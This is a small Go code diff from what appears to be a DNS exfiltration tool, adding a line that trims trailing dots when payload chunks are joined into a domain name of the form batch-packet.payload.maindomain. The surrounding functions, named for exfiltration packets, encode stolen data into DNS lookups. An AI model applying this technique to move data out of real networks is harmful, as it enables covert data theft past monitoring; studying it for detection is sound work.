@@ -35,6 +35,7 @@ func EncodeDataToExfilPackets(payload string, mainDomain string) []ExfilPacket {
 
 func (ep *ExfilPacket) ToFqdn() string {
 	payloadWithDots := strings.Join(ep.payload[:], ".")
+	payloadWithDots = strings.TrimRight(payloadWithDots, ".")
 	return fmt.Sprintf("%s-%d.%s.%s", ep.batchId, ep.packetNo, payloadWithDots, ep.mainDomain)
 }
 
